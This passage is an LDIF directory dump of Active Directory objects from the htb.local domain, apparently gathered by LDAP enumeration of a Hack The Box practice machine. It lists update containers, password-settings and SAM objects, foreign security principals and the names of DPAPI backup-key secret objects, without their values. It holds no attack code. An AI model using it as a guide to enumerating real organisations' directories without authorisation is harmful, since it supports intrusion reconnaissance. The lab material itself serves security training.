dSCorePropagationData: 16010101000000.0Z

# b96ed344-545a-4172-aa0c-68118202f125, Operations, DomainUpdates, System, htb.
 local
dn: CN=b96ed344-545a-4172-aa0c-68118202f125,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: b96ed344-545a-4172-aa0c-68118202f125
distinguishedName: CN=b96ed344-545a-4172-aa0c-68118202f125,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6010
uSNChanged: 94808
showInAdvancedViewOnly: TRUE
name: b96ed344-545a-4172-aa0c-68118202f125
objectGUID:: mpJ0h5vDWkaqBX2QYNa7fQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 4c93ad42-178a-4275-8600-16811d28f3aa, Operations, DomainUpdates, System, htb.
 local
dn: CN=4c93ad42-178a-4275-8600-16811d28f3aa,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 4c93ad42-178a-4275-8600-16811d28f3aa
distinguishedName: CN=4c93ad42-178a-4275-8600-16811d28f3aa,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6011
uSNChanged: 94813
showInAdvancedViewOnly: TRUE
name: 4c93ad42-178a-4275-8600-16811d28f3aa
objectGUID:: y34mYRaKhUOUJYymnJ2EyQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# c88227bc-fcca-4b58-8d8a-cd3d64528a02, Operations, DomainUpdates, System, htb.
 local
dn: CN=c88227bc-fcca-4b58-8d8a-cd3d64528a02,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: c88227bc-fcca-4b58-8d8a-cd3d64528a02
distinguishedName: CN=c88227bc-fcca-4b58-8d8a-cd3d64528a02,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6012
uSNChanged: 94818
showInAdvancedViewOnly: TRUE
name: c88227bc-fcca-4b58-8d8a-cd3d64528a02
objectGUID:: tzxpAVszJk29tCFxuxlFfQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 5e1574f6-55df-493e-a671-aaeffca6a100, Operations, DomainUpdates, System, htb.
 local
dn: CN=5e1574f6-55df-493e-a671-aaeffca6a100,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 5e1574f6-55df-493e-a671-aaeffca6a100
distinguishedName: CN=5e1574f6-55df-493e-a671-aaeffca6a100,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6013
uSNChanged: 94821
showInAdvancedViewOnly: TRUE
name: 5e1574f6-55df-493e-a671-aaeffca6a100
objectGUID:: 9SUelTY8E0Wg+9Xp2sEjyg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# d262aae8-41f7-48ed-9f35-56bbb677573d, Operations, DomainUpdates, System, htb.
 local
dn: CN=d262aae8-41f7-48ed-9f35-56bbb677573d,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: d262aae8-41f7-48ed-9f35-56bbb677573d
distinguishedName: CN=d262aae8-41f7-48ed-9f35-56bbb677573d,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6014
uSNChanged: 94824
showInAdvancedViewOnly: TRUE
name: d262aae8-41f7-48ed-9f35-56bbb677573d
objectGUID:: 6Y1UBjptrUKilkbjiqqQgw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 82112ba0-7e4c-4a44-89d9-d46c9612bf91, Operations, DomainUpdates, System, htb.
 local
dn: CN=82112ba0-7e4c-4a44-89d9-d46c9612bf91,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 82112ba0-7e4c-4a44-89d9-d46c9612bf91
distinguishedName: CN=82112ba0-7e4c-4a44-89d9-d46c9612bf91,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6015
uSNChanged: 94827
showInAdvancedViewOnly: TRUE
name: 82112ba0-7e4c-4a44-89d9-d46c9612bf91
objectGUID:: rMaYq94NUU636lA+haD23A==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# c3c927a6-cc1d-47c0-966b-be8f9b63d991, Operations, DomainUpdates, System, htb.
 local
dn: CN=c3c927a6-cc1d-47c0-966b-be8f9b63d991,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: c3c927a6-cc1d-47c0-966b-be8f9b63d991
distinguishedName: CN=c3c927a6-cc1d-47c0-966b-be8f9b63d991,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6016
uSNChanged: 94830
showInAdvancedViewOnly: TRUE
name: c3c927a6-cc1d-47c0-966b-be8f9b63d991
objectGUID:: yXHGEY6DkUmdMMt5Mn6MwA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 54afcfb9-637a-4251-9f47-4d50e7021211, Operations, DomainUpdates, System, htb.
 local
dn: CN=54afcfb9-637a-4251-9f47-4d50e7021211,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 54afcfb9-637a-4251-9f47-4d50e7021211
distinguishedName: CN=54afcfb9-637a-4251-9f47-4d50e7021211,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6017
uSNChanged: 94833
showInAdvancedViewOnly: TRUE
name: 54afcfb9-637a-4251-9f47-4d50e7021211
objectGUID:: ZX008ztRGkypAKvR7Gn/Yg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# f4728883-84dd-483c-9897-274f2ebcf11e, Operations, DomainUpdates, System, htb.
 local
dn: CN=f4728883-84dd-483c-9897-274f2ebcf11e,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: f4728883-84dd-483c-9897-274f2ebcf11e
distinguishedName: CN=f4728883-84dd-483c-9897-274f2ebcf11e,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6018
uSNChanged: 94836
showInAdvancedViewOnly: TRUE
name: f4728883-84dd-483c-9897-274f2ebcf11e
objectGUID:: O6onGO1rgEOJKklFYxiDqg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff, Operations, DomainUpdates, System, htb.
 local
dn: CN=ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
distinguishedName: CN=ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6019
uSNChanged: 94839
showInAdvancedViewOnly: TRUE
name: ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
objectGUID:: zcpQxGcH9UO5BSWA/DhRtA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 83C53DA7-427E-47A4-A07A-A324598B88F7, Operations, DomainUpdates, System, htb.
 local
dn: CN=83C53DA7-427E-47A4-A07A-A324598B88F7,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 83C53DA7-427E-47A4-A07A-A324598B88F7
distinguishedName: CN=83C53DA7-427E-47A4-A07A-A324598B88F7,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6020
uSNChanged: 94842
showInAdvancedViewOnly: TRUE
name: 83C53DA7-427E-47A4-A07A-A324598B88F7
objectGUID:: U5r1KNRjqUGGgsaPfx9GlA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# C81FC9CC-0130-4FD1-B272-634D74818133, Operations, DomainUpdates, System, htb.
 local
dn: CN=C81FC9CC-0130-4FD1-B272-634D74818133,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: C81FC9CC-0130-4FD1-B272-634D74818133
distinguishedName: CN=C81FC9CC-0130-4FD1-B272-634D74818133,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6021
uSNChanged: 94845
showInAdvancedViewOnly: TRUE
name: C81FC9CC-0130-4FD1-B272-634D74818133
objectGUID:: DXqxpGqFP0y43ipOZf12ow==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# E5F9E791-D96D-4FC9-93C9-D53E1DC439BA, Operations, DomainUpdates, System, htb.
 local
dn: CN=E5F9E791-D96D-4FC9-93C9-D53E1DC439BA,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
distinguishedName: CN=E5F9E791-D96D-4FC9-93C9-D53E1DC439BA,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6022
uSNChanged: 94848
showInAdvancedViewOnly: TRUE
name: E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
objectGUID:: 3X6DAR0WI0KaY69kXDjKwQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124639.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# e6d5fd00-385d-4e65-b02d-9da3493ed850, Operations, DomainUpdates, System, htb.
 local
dn: CN=e6d5fd00-385d-4e65-b02d-9da3493ed850,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: e6d5fd00-385d-4e65-b02d-9da3493ed850
distinguishedName: CN=e6d5fd00-385d-4e65-b02d-9da3493ed850,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6023
uSNChanged: 94851
showInAdvancedViewOnly: TRUE
name: e6d5fd00-385d-4e65-b02d-9da3493ed850
objectGUID:: OpQjzXdq4kOzPi+4TwXA3w==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 3a6b3fbf-3168-4312-a10d-dd5b3393952d, Operations, DomainUpdates, System, htb.
 local
dn: CN=3a6b3fbf-3168-4312-a10d-dd5b3393952d,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 3a6b3fbf-3168-4312-a10d-dd5b3393952d
distinguishedName: CN=3a6b3fbf-3168-4312-a10d-dd5b3393952d,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6024
uSNChanged: 94854
showInAdvancedViewOnly: TRUE
name: 3a6b3fbf-3168-4312-a10d-dd5b3393952d
objectGUID:: aDzpldo5EkO/AqV9eK1OAg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 7F950403-0AB3-47F9-9730-5D7B0269F9BD, Operations, DomainUpdates, System, htb.
 local
dn: CN=7F950403-0AB3-47F9-9730-5D7B0269F9BD,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 7F950403-0AB3-47F9-9730-5D7B0269F9BD
distinguishedName: CN=7F950403-0AB3-47F9-9730-5D7B0269F9BD,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6025
uSNChanged: 94857
showInAdvancedViewOnly: TRUE
name: 7F950403-0AB3-47F9-9730-5D7B0269F9BD
objectGUID:: QRxwswG6mkSHDJ8nmzQhoA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 434bb40d-dbc9-4fe7-81d4-d57229f7b080, Operations, DomainUpdates, System, htb.
 local
dn: CN=434bb40d-dbc9-4fe7-81d4-d57229f7b080,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 434bb40d-dbc9-4fe7-81d4-d57229f7b080
distinguishedName: CN=434bb40d-dbc9-4fe7-81d4-d57229f7b080,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6026
uSNChanged: 94860
showInAdvancedViewOnly: TRUE
name: 434bb40d-dbc9-4fe7-81d4-d57229f7b080
objectGUID:: j+2oBeCUNkSQ76PyYYBNvQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# Windows2003Update, DomainUpdates, System, htb.local
dn: CN=Windows2003Update,CN=DomainUpdates,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Windows2003Update
distinguishedName: CN=Windows2003Update,CN=DomainUpdates,CN=System,DC=htb,DC=l
 ocal
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6027
uSNChanged: 94863
showInAdvancedViewOnly: TRUE
name: Windows2003Update
objectGUID:: PRapTQPJBEas49hvso4bYQ==
revision: 9
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# ActiveDirectoryUpdate, DomainUpdates, System, htb.local
dn: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ActiveDirectoryUpdate
distinguishedName: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=htb,
 DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6028
uSNChanged: 94866
showInAdvancedViewOnly: TRUE
name: ActiveDirectoryUpdate
objectGUID:: vj4B+2YByUGS01g9OqPNEw==
revision: 15
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# BCKUPKEY_bcb64993-1db6-45d5-9b0d-b8186e8ee6a4 Secret, System, htb.local
dn: CN=BCKUPKEY_bcb64993-1db6-45d5-9b0d-b8186e8ee6a4 Secret,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: leaf
objectClass: secret
cn: BCKUPKEY_bcb64993-1db6-45d5-9b0d-b8186e8ee6a4 Secret
distinguishedName: CN=BCKUPKEY_bcb64993-1db6-45d5-9b0d-b8186e8ee6a4 Secret,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919110325.0Z
whenChanged: 20190919110325.0Z
uSNCreated: 13037
uSNChanged: 13039
showInAdvancedViewOnly: TRUE
name: BCKUPKEY_bcb64993-1db6-45d5-9b0d-b8186e8ee6a4 Secret
objectGUID:: W3i6wzNBukqa9ejg+xmRag==
lastSetTime: 132133646051844585
priorSetTime: 132133646051844585
objectCategory: CN=Secret,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124526.0Z
dSCorePropagationData: 16010101000000.0Z

# BCKUPKEY_P Secret, System, htb.local
dn: CN=BCKUPKEY_P Secret,CN=System,DC=htb,DC=local
objectClass: top
objectClass: leaf
objectClass: secret
cn: BCKUPKEY_P Secret
distinguishedName: CN=BCKUPKEY_P Secret,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919110325.0Z
whenChanged: 20190919110325.0Z
uSNCreated: 13040
uSNChanged: 13042
showInAdvancedViewOnly: TRUE
name: BCKUPKEY_P Secret
objectGUID:: OblEPl2QRk+8/nst10HgGQ==
lastSetTime: 132133646051844585
priorSetTime: 132133646051844585
objectCategory: CN=Secret,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124526.0Z
dSCorePropagationData: 16010101000000.0Z

# BCKUPKEY_b5b09264-b153-45ba-9501-e0f2b84c57a7 Secret, System, htb.local
dn: CN=BCKUPKEY_b5b09264-b153-45ba-9501-e0f2b84c57a7 Secret,CN=System,DC=htb,D
 C=local
objectClass: top
objectClass: leaf
objectClass: secret
cn: BCKUPKEY_b5b09264-b153-45ba-9501-e0f2b84c57a7 Secret
distinguishedName: CN=BCKUPKEY_b5b09264-b153-45ba-9501-e0f2b84c57a7 Secret,CN=
 System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919110325.0Z
whenChanged: 20190919110325.0Z
uSNCreated: 13043
uSNChanged: 13045
showInAdvancedViewOnly: TRUE
name: BCKUPKEY_b5b09264-b153-45ba-9501-e0f2b84c57a7 Secret
objectGUID:: vlbxnupd102k8dqFlGfCCw==
lastSetTime: 132133646053875889
priorSetTime: 132133646053721372
objectCategory: CN=Secret,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124526.0Z
dSCorePropagationData: 16010101000000.0Z

# BCKUPKEY_PREFERRED Secret, System, htb.local
dn: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=htb,DC=local
objectClass: top
objectClass: leaf
objectClass: secret
cn: BCKUPKEY_PREFERRED Secret
distinguishedName: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919110325.0Z
whenChanged: 20190919110325.0Z
uSNCreated: 13046
uSNChanged: 13048
showInAdvancedViewOnly: TRUE
name: BCKUPKEY_PREFERRED Secret
objectGUID:: 9UBDhVEEnEakNxUfywVL7w==
lastSetTime: 132133646053875889
priorSetTime: 132133646053875889
objectCategory: CN=Secret,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124526.0Z
dSCorePropagationData: 16010101000000.0Z

# Password Settings Container, System, htb.local
dn: CN=Password Settings Container,CN=System,DC=htb,DC=local
objectClass: top
objectClass: msDS-PasswordSettingsContainer
cn: Password Settings Container
distinguishedName: CN=Password Settings Container,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 6029
uSNChanged: 6029
showInAdvancedViewOnly: TRUE
name: Password Settings Container
objectGUID:: 358rMKNC2ES2fBrHWRUhtg==
systemFlags: -1946157056
objectCategory: CN=ms-DS-Password-Settings-Container,CN=Schema,CN=Configuratio
 n,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# PSPs, System, htb.local
dn: CN=PSPs,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
objectClass: msImaging-PSPs
cn: PSPs
distinguishedName: CN=PSPs,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6030
uSNChanged: 94872
name: PSPs
objectGUID:: w+5VnnA0rEGsgUiAfp+ixg==
objectCategory: CN=ms-Imaging-PSPs,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# Server, System, htb.local
dn: CN=Server,CN=System,DC=htb,DC=local
objectClass: top
objectClass: securityObject
objectClass: samServer
cn: Server
distinguishedName: CN=Server,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918105833.0Z
uSNCreated: 8237
uSNChanged: 12569
showInAdvancedViewOnly: TRUE
name: Server
objectGUID:: vH+ut3wt00m15jcw+E/V6A==
revision: 65544
systemFlags: -1946157056
objectCategory: CN=Sam-Server,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
samDomainUpdates:: /v8B

# LostAndFound, htb.local
dn: CN=LostAndFound,DC=htb,DC=local
objectClass: top
objectClass: lostAndFound
cn: LostAndFound
description: Default container for orphaned objects
distinguishedName: CN=LostAndFound,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5886
uSNChanged: 5886
showInAdvancedViewOnly: TRUE
name: LostAndFound
objectGUID:: gXT6r088uUOXaFC/uwqxcA==
systemFlags: -1946157056
objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 20201229124525.0Z
dSCorePropagationData: 16010101000000.0Z

# Infrastructure, htb.local
dn: CN=Infrastructure,DC=htb,DC=local
objectClass: top
objectClass: infrastructureUpdate
cn: Infrastructure
distinguishedName: CN=Infrastructure,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6032
uSNChanged: 94878
showInAdvancedViewOnly: TRUE
name: Infrastructure
objectGUID:: t885jQ657ku2EKZQkvphFg==
fSMORoleOwner: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=htb,DC=local
systemFlags: -1946157056
objectCategory: CN=Infrastructure-Update,CN=Schema,CN=Configuration,DC=htb,DC=
 local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# ForeignSecurityPrincipals, htb.local
dn: CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ForeignSecurityPrincipals
description: Default container for security identifiers (SIDs) associated with
  objects from external, trusted domains
distinguishedName: CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6033
uSNChanged: 94881
showInAdvancedViewOnly: FALSE
name: ForeignSecurityPrincipals
objectGUID:: XaZ3pKHymU6omBnbn+m4Mw==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# S-1-5-9, ForeignSecurityPrincipals, htb.local
dn: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-9
distinguishedName: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12394
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
uSNChanged: 12394
showInAdvancedViewOnly: TRUE
name: S-1-5-9
objectGUID:: h9y3lWj/WU6GA70GlXZ1Uw==
objectSid:: AQEAAAAAAAUJAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# S-1-5-7, ForeignSecurityPrincipals, htb.local
dn: CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-7
